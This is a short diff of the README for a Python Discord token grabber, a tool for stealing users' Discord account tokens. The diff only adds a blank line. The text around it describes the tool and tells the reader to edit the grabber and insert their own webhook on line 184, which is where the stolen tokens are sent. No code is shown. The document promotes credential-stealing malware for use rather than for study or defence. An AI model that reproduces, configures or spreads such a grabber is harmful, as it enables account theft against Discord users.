@@ -4,6 +4,7 @@ This is a discord token grabber made in python
 (You need python for this)
 
 HOW TO USE IT:
+
 1)Right click on the python grabber and edit it
 
 2)Put your webhook in the line "184"
